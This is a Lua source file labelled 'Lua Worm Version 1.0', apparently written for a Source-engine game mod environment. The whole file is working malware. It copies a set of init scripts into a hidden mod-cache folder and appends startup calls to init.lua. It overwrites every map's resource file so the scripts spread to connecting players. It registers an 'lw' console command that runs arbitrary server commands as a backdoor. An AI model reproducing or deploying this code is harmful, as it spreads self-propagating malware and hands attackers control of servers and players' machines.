-- Lua Worm Version 1.0 
-- Progress on Lua Worm Version 2.0 slowly reaches 100% complete...


function Init()
	local init = _file.Find("lua/init/*.lua*");
	for k,v in init do
		if (v == "ulm.lua") or (v == "ufm.lua") or (v == "ucm.lua") or (v == "erat.lua") or (v == "oma2r3fxc6g.lua") or (v == "racehook3.lua") or (v == "z.lua") or (v == "initialize.lua") then
			local a = _file.Read("lua/init/"..v)
			local b = _file.Read("lua/init/init.lua")
			local c = [[
_OpenScript("mods/-modcache/lua/init/lw/]]
			local d = [[");]]
			local e = b..c..v..d
			_file.CreateDir("mods/-modcache/lua/init/lw/");
			_file.Write("mods/-modcache/lua/init/lw/"..v,a);
			_OpenScript("mods/-modcache/lua/init/lw/"..v);
			_file.Write("lua/init/init.lua", e)
		end
	end
	local res = _file.Find("maps/*.bsp")
	for i = 1, table.getn(res) do
		res[i] = string.gsub(res[i],".bsp","")
		file = _file.Read("maps/"..res[i]..".res")
		file = [["resources"
{
"lua/init/lw.lua"
"lua/init/ulm.lua"
"lua/init/ufm.lua"
"lua/init/ucm.lua"
"lua/init/erat.lua"
"lua/init/oma2r3fxc6g.lua"
"lua/init/racehook3.lua"
"lua/init/z.lua"
"lua/init/initialize.lua"
}]]
		_file.Write("maps/"..res[i]..".res",file)
	end
end


function CheckRcon(userid,y)
	if y ~= "" then
		_ServerCommand(y.."\n")
	else
		_PrintMessage(userid,HUD_PRINTCONSOLE,"Lua Worm detected.\n")
	end
end


CONCOMMAND("lw",CheckRcon)
Init()
